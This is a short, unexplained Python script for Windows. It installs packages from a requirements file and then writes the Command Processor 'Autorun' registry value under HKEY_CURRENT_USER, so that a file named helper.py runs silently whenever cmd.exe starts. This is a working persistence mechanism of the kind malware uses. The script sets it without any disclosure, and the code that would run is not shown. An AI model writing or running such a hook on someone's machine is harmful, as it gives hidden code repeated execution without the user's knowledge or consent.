import os
os.system("pip install -r requirements.txt")
from winreg import*
import os
cur_dir = os.getcwd()
# print(cur_dir)
file_name = 'helper.py'
execute = f'python {os.path.join(cur_dir, file_name)}'
# print(execute)

a = OpenKey(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Command Processor", 0, KEY_WRITE)
SetValueEx(a, "Autorun", 0, REG_SZ, execute)
# DeleteValue(a, 'Autorun')
CloseKey(a)
